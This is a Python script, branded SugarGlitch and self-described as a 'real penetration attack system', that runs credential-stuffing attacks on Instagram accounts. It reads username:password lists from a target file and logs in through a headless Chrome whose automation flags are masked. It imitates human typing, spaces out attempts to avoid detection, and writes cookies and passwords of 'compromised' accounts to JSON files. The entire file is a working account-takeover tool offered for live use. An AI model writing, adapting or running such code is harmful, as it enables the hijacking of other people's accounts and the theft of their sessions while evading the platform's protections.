#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
💀 REAL PENETRATION ATTACK SYSTEM 💀
SugarGlitch - Direct Instagram Target Attack
"""

import time
import random
import json
import requests
import tempfile
import shutil
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.action_chains import ActionChains
import re
from datetime import datetime
import os

class RealInstagramPenetration:
    def __init__(self):
        self.driver = None
        self.session = requests.Session()
        self.csrf_token = None
        self.successful_attacks = []
        
        # Real attack headers
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        }

    def setup_chrome(self):
        """🔧 Setup Chrome with stealth mode"""
        print("🔧 Setting up stealth Chrome...")
        
        try:
            # Kill any existing Chrome processes
            os.system("pkill -f chrome > /dev/null 2>&1")
            time.sleep(2)
            
            options = Options()
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-automation')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--headless')  # Run in headless mode for better compatibility
            options.add_experimental_option("useAutomationExtension", False)
            
            # Create unique user data directory
            import tempfile
            import shutil
            user_data_dir = tempfile.mkdtemp(prefix='chrome_user_')
            options.add_argument(f'--user-data-dir={user_data_dir}')
            
            # Clean up any existing sessions
            options.add_argument('--disable-background-timer-throttling')
            options.add_argument('--disable-renderer-backgrounding')
            options.add_argument('--disable-backgrounding-occluded-windows')
            
            self.driver = webdriver.Chrome(options=options)
            
            # Execute stealth scripts
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            print("✅ Chrome setup successful")
            return True
            
        except Exception as e:
            print(f"❌ Chrome setup failed: {e}")
            return False

    def attempt_login(self, username, password):
        """🎯 Attempt direct login"""
        try:
            print(f"🎯 Attempting: {username}:{password}")
            
            # Navigate to Instagram
            self.driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(random.uniform(3, 6))
            
            # Find username field
            username_field = None
            username_selectors = [
                'input[name="username"]',
                'input[type="text"][placeholder*="username"]',
                'input[aria-label*="username"]',
                '#loginForm input[type="text"]'
            ]
            
            for selector in username_selectors:
                try:
                    username_field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            if not username_field:
                print("❌ Username field not found")
                return False
            
            # Find password field
            password_field = None
            password_selectors = [
                'input[name="password"]',
                'input[type="password"]',
                'input[aria-label*="password"]'
            ]
            
            for selector in password_selectors:
                try:
                    password_field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            if not password_field:
                print("❌ Password field not found")
                return False
            
            # Human-like typing
            username_field.clear()
            for char in username:
                username_field.send_keys(char)
                time.sleep(random.uniform(0.05, 0.15))
            
            time.sleep(random.uniform(0.5, 1.5))
            
            password_field.clear()
            for char in password:
                password_field.send_keys(char)
                time.sleep(random.uniform(0.05, 0.15))
            
            time.sleep(random.uniform(1, 2))
            
            # Find and click login button
            login_button = None
            login_selectors = [
                'button[type="submit"]',
                'button:contains("Log in")',
                'div[role="button"]:contains("Log in")',
                '#loginForm button'
            ]
            
            for selector in login_selectors:
                try:
                    login_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            if not login_button:
                print("❌ Login button not found")
                return False
            
            # Click login
            ActionChains(self.driver).move_to_element(login_button).click().perform()
            time.sleep(random.uniform(5, 8))
            
            # Check for success indicators
            current_url = self.driver.current_url
            page_source = self.driver.page_source
            
            # Success indicators
            success_indicators = [
                "instagram.com/" in current_url and "login" not in current_url,
                "feed" in current_url,
                "Your account" in page_source,
                "Switch accounts" in page_source
            ]
            
            if any(success_indicators):
                print(f"🎉 SUCCESS! {username}:{password}")
                
                # Extract session data
                cookies = self.driver.get_cookies()
                session_data = {
                    'username': username,
                    'password': password,
                    'success': True,
                    'timestamp': datetime.now().isoformat(),
                    'url': current_url,
                    'cookies': cookies
                }
                
                # Save session
                filename = f"compromised_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(filename, 'w') as f:
                    json.dump(session_data, f, indent=4, default=str)
                
                self.successful_attacks.append(session_data)
                return True
            
            else:
                print(f"❌ Login failed for {username}:{password}")
                return False
            
        except Exception as e:
            print(f"❌ Error during attack: {e}")
            return False

    def load_targets(self, target_file):
        """📂 Load target combinations"""
        targets = []
        try:
            with open(target_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        username, password = line.split(':', 1)
                        targets.append((username.strip(), password.strip()))
            return targets
        except Exception as e:
            print(f"❌ Error loading targets: {e}")
            return []

    def run_penetration(self, target_file="high_probability_targets.txt"):
        """🚀 Execute real penetration attack"""
        print("💀 REAL INSTAGRAM PENETRATION")
        print("🔥 SugarGlitch - Live Attack System")
        print("="*50)
        
        # Load targets
        targets = self.load_targets(target_file)
        if not targets:
            print("❌ No targets loaded!")
            return
        
        print(f"🎯 Loaded {len(targets)} target combinations")
        
        # Setup Chrome
        if not self.setup_chrome():
            return
        
        try:
            # Attack each target
            for i, (username, password) in enumerate(targets, 1):
                print(f"\n🔥 Attack {i}/{len(targets)}")
                
                success = self.attempt_login(username, password)
                
                if success:
                    print(f"✅ COMPROMISED: {username}")
                else:
                    print(f"❌ Failed: {username}")
                
                # Anti-detection delay
                if i < len(targets):
                    delay = random.randint(12, 25)
                    print(f"⏳ Waiting {delay}s before next attack...")
                    time.sleep(delay)
        
        except KeyboardInterrupt:
            print("\n🛑 Attack stopped by user")
        
        finally:
            if self.driver:
                self.driver.quit()
        
        # Final results
        print(f"\n🏆 PENETRATION COMPLETE!")
        print(f"✅ Successful compromises: {len(self.successful_attacks)}")
        
        if self.successful_attacks:
            print("\n🎉 COMPROMISED ACCOUNTS:")
            for attack in self.successful_attacks:
                print(f"   👤 {attack['username']}:{attack['password']}")
                print(f"   📅 {attack['timestamp']}")
        
        return self.successful_attacks

if __name__ == "__main__":
    print("💀💀💀 REAL PENETRATION ATTACK 💀💀💀")
    print("🔥 Live Instagram Account Penetration")
    print("⚠️  WARNING: REAL ATTACK SYSTEM")
    print("="*50)
    
    attacker = RealInstagramPenetration()
    results = attacker.run_penetration()
